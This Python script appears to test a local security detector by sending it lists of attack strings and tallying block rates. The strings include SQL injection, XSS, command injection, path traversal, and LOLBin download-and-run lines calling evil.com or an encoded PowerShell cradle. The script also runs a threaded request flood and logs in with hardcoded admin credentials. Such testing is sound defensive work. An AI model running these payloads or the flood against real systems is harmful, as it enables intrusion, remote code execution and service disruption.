"""
Advanced Attack Testing Suite - Test semua jenis serangan
"""
import requests
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class AttackTester:
    def __init__(self, target_url="http://127.0.0.1:9001"):
        self.target_url = target_url
        self.token = None
        self.results = {
            "total_attacks": 0,
            "successful_attacks": 0,
            "blocked_attacks": 0,
            "failed_requests": 0,
            "response_times": [],
            "attack_types": {}
        }
    
    def login(self):
        """Login untuk mendapatkan token"""
        try:
            response = requests.post(
                f"{self.target_url}/auth/login",
                json={"username": "admin", "password": "admin123"},
                timeout=10
            )
            if response.status_code == 200:
                self.token = response.json().get("access_token")
                print(f"✅ Login berhasil, token: {self.token[:20]}...")
                return True
            else:
                print(f"❌ Login gagal: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Login error: {e}")
            return False
    
    def test_sql_injection(self):
        """Test SQL Injection attacks"""
        print("\n🎯 Testing SQL Injection Attacks...")
        
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1 --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 'x'='x",
            "1' OR '1'='1' /*",
            "' UNION SELECT username, password FROM users --",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_payloads:
            self.send_attack("sql_injection", payload)
    
    def test_xss_attacks(self):
        """Test XSS attacks"""
        print("\n🎯 Testing XSS Attacks...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<script>document.cookie='stolen'</script>",
            "<script>window.location='http://evil.com'</script>",
            "<div onclick=alert('XSS')>Click me</div>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        ]
        
        for payload in xss_payloads:
            self.send_attack("xss", payload)
    
    def test_command_injection(self):
        """Test Command Injection attacks"""
        print("\n🎯 Testing Command Injection Attacks...")
        
        cmd_payloads = [
            "; dir",
            "&& whoami",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; del /f /q *.*",
            "&& net user hacker password /add",
            "| powershell -c Get-Process",
            "; cmd.exe /c dir",
            "&& systeminfo",
            "| findstr /i password",
            "; shutdown /s /t 0"
        ]
        
        for payload in cmd_payloads:
            self.send_attack("command_injection", payload)
    
    def test_path_traversal(self):
        """Test Path Traversal attacks"""
        print("\n🎯 Testing Path Traversal Attacks...")
        
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\..\\boot.ini",
            "../../../proc/version",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/shadow",
            "..\\..\\..\\autoexec.bat",
            "../../../var/log/apache/access.log"
        ]
        
        for payload in path_payloads:
            self.send_attack("path_traversal", payload)
    
    def test_advanced_attacks(self):
        """Test Advanced/APT-style attacks"""
        print("\n🎯 Testing Advanced Attacks...")
        
        advanced_payloads = [
            "powershell -enc JABlAHgAZQBjACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQA=",
            "cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass",
            "wscript.exe //B //E:jscript malicious.js",
            "cscript.exe //B //E:vbscript backdoor.vbs",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('APT');",
            "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
            "bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/malware.exe C:\\temp\\malware.exe",
            "regsvr32 /s /n /u /i:http://evil.com/script.sct scrobj.dll",
            "mshta.exe javascript:a=GetObject(\"script:http://evil.com/payload.sct\").Exec();close();",
            "schtasks /create /tn \"UpdateTask\" /tr \"C:\\temp\\backdoor.exe\" /sc minute /mo 1"
        ]
        
        for payload in advanced_payloads:
            self.send_attack("advanced_apt", payload)
    
    def send_attack(self, attack_type, payload):
        """Send single attack payload"""
        start_time = time.time()
        
        try:
            headers = {}
            if self.token:
                headers["Authorization"] = f"Bearer {self.token}"
            
            response = requests.post(
                f"{self.target_url}/api/analyze",
                json={"input": payload},
                headers=headers,
                timeout=10
            )
            
            response_time = time.time() - start_time
            self.results["response_times"].append(response_time)
            self.results["total_attacks"] += 1
            
            if attack_type not in self.results["attack_types"]:
                self.results["attack_types"][attack_type] = {
                    "total": 0, "blocked": 0, "successful": 0
                }
            
            self.results["attack_types"][attack_type]["total"] += 1
            
            if response.status_code == 200:
                result = response.json()
                analysis = result.get("analysis", {})
                
                if analysis.get("blocked", False):
                    self.results["blocked_attacks"] += 1
                    self.results["attack_types"][attack_type]["blocked"] += 1
                    status = "🛡️ BLOCKED"
                    color = "🔴"
                else:
                    self.results["successful_attacks"] += 1
                    self.results["attack_types"][attack_type]["successful"] += 1
                    status = "⚠️ PASSED"
                    color = "🟡"
                
                confidence = analysis.get("confidence", 0.0)
                threat_type = analysis.get("type", "unknown")
                
                print(f"{color} {attack_type.upper()}: {status} | Confidence: {confidence:.2f} | Type: {threat_type} | Time: {response_time:.3f}s")
                
            elif response.status_code == 429:
                print(f"🚫 RATE LIMITED: {attack_type}")
                self.results["blocked_attacks"] += 1
                self.results["attack_types"][attack_type]["blocked"] += 1
            else:
                print(f"❌ ERROR {response.status_code}: {attack_type}")
                self.results["failed_requests"] += 1
                
        except requests.exceptions.Timeout:
            print(f"⏰ TIMEOUT: {attack_type}")
            self.results["failed_requests"] += 1
        except Exception as e:
            print(f"❌ EXCEPTION: {attack_type} - {str(e)}")
            self.results["failed_requests"] += 1
    
    def ddos_test(self, duration=30, threads=20):
        """DDoS stress test"""
        print(f"\n🌊 Starting DDoS Test - Duration: {duration}s, Threads: {threads}")
        
        start_time = time.time()
        request_count = 0
        blocked_count = 0
        
        def ddos_worker():
            nonlocal request_count, blocked_count
            
            payloads = [
                "' OR '1'='1",
                "<script>alert('ddos')</script>",
                "; whoami",
                "../../../etc/passwd",
                "normal request"
            ]
            
            while time.time() - start_time < duration:
                try:
                    payload = payloads[request_count % len(payloads)]
                    headers = {"Authorization": f"Bearer {self.token}"} if self.token else {}
                    
                    response = requests.post(
                        f"{self.target_url}/api/analyze",
                        json={"input": f"ddos_test_{request_count}_{payload}"},
                        headers=headers,
                        timeout=5
                    )
                    
                    request_count += 1
                    
                    if response.status_code == 429:
                        blocked_count += 1
                        print(f"🚫 Rate limited after {request_count} requests")
                    elif response.status_code == 200:
                        result = response.json()
                        if result.get("analysis", {}).get("blocked", False):
                            blocked_count += 1
                    
                except requests.exceptions.Timeout:
                    print("⏰ Request timeout during DDoS")
                except Exception as e:
                    print(f"❌ DDoS error: {e}")
                
                time.sleep(0.01)  # Small delay
        
        # Start DDoS threads
        threads_list = []
        for _ in range(threads):
            thread = threading.Thread(target=ddos_worker)
            thread.start()
            threads_list.append(thread)
        
        # Monitor progress
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            rps = request_count / elapsed if elapsed > 0 else 0
            block_rate = (blocked_count / request_count * 100) if request_count > 0 else 0
            
            print(f"⚡ DDoS Progress: {elapsed:.1f}s | Requests: {request_count} | RPS: {rps:.1f} | Blocked: {block_rate:.1f}%")
            time.sleep(5)
        
        # Wait for threads to complete
        for thread in threads_list:
            thread.join()
        
        total_time = time.time() - start_time
        final_rps = request_count / total_time
        final_block_rate = (blocked_count / request_count * 100) if request_count > 0 else 0
        
        print(f"\n📊 DDoS Test Results:")
        print(f"   Duration: {total_time:.2f} seconds")
        print(f"   Total Requests: {request_count}")
        print(f"   Requests/Second: {final_rps:.2f}")
        print(f"   Blocked Requests: {blocked_count}")
        print(f"   Block Rate: {final_block_rate:.1f}%")
        
        if final_block_rate > 50:
            print("   🟢 EXCELLENT: Strong DDoS protection")
        elif final_block_rate > 20:
            print("   🟡 GOOD: Moderate DDoS protection")
        else:
            print("   🔴 WEAK: Limited DDoS protection")
    
    def run_all_tests(self):
        """Run all attack tests"""
        print("[ATTACK] INFINITE AI SECURITY - ADVANCED ATTACK TESTING")
        print("=" * 60)
        
        # Login first
        if not self.login():
            print("❌ Cannot proceed without authentication")
            return
        
        # Run attack tests
        self.test_sql_injection()
        self.test_xss_attacks()
        self.test_command_injection()
        self.test_path_traversal()
        self.test_advanced_attacks()
        
        # Run DDoS test
        self.ddos_test(duration=20, threads=10)
        
        # Print final results
        self.print_results()
    
    def print_results(self):
        """Print comprehensive test results"""
        print("\n" + "=" * 60)
        print("📊 COMPREHENSIVE ATTACK TEST RESULTS")
        print("=" * 60)
        
        total_attacks = self.results["total_attacks"]
        blocked = self.results["blocked_attacks"]
        successful = self.results["successful_attacks"]
        failed = self.results["failed_requests"]
        
        print(f"📈 OVERALL STATISTICS:")
        print(f"   Total Attacks: {total_attacks}")
        print(f"   🛡️ Blocked: {blocked} ({blocked/total_attacks*100:.1f}%)")
        print(f"   ⚠️ Successful: {successful} ({successful/total_attacks*100:.1f}%)")
        print(f"   ❌ Failed: {failed} ({failed/total_attacks*100:.1f}%)")
        
        if self.results["response_times"]:
            avg_time = sum(self.results["response_times"]) / len(self.results["response_times"])
            print(f"   ⚡ Avg Response Time: {avg_time:.3f}s")
        
        print(f"\n🎯 ATTACK TYPE BREAKDOWN:")
        for attack_type, stats in self.results["attack_types"].items():
            total = stats["total"]
            blocked = stats["blocked"]
            successful = stats["successful"]
            block_rate = (blocked / total * 100) if total > 0 else 0
            
            print(f"   {attack_type.upper()}:")
            print(f"     Total: {total} | Blocked: {blocked} | Success: {successful} | Block Rate: {block_rate:.1f}%")
        
        # Security assessment
        overall_block_rate = (self.results["blocked_attacks"] / total_attacks * 100) if total_attacks > 0 else 0
        
        print(f"\n🛡️ SECURITY ASSESSMENT:")
        if overall_block_rate > 80:
            print("   🟢 EXCELLENT: Very strong security posture")
        elif overall_block_rate > 60:
            print("   🟡 GOOD: Solid security with room for improvement")
        elif overall_block_rate > 40:
            print("   🟠 MODERATE: Basic protection, needs enhancement")
        else:
            print("   🔴 WEAK: Significant security vulnerabilities")
        
        print(f"   Overall Block Rate: {overall_block_rate:.1f}%")
        
        # Recommendations
        print(f"\n💡 RECOMMENDATIONS:")
        if successful > 0:
            print("   - Review and strengthen threat detection patterns")
            print("   - Consider implementing additional security layers")
            print("   - Enable more aggressive blocking policies")
        
        if failed > total_attacks * 0.1:
            print("   - Investigate system stability and error handling")
            print("   - Consider increasing timeout values")
        
        if overall_block_rate < 70:
            print("   - Implement machine learning-based detection")
            print("   - Add behavioral analysis capabilities")
            print("   - Consider implementing honeypots")

if __name__ == "__main__":
    tester = AttackTester()
    tester.run_all_tests()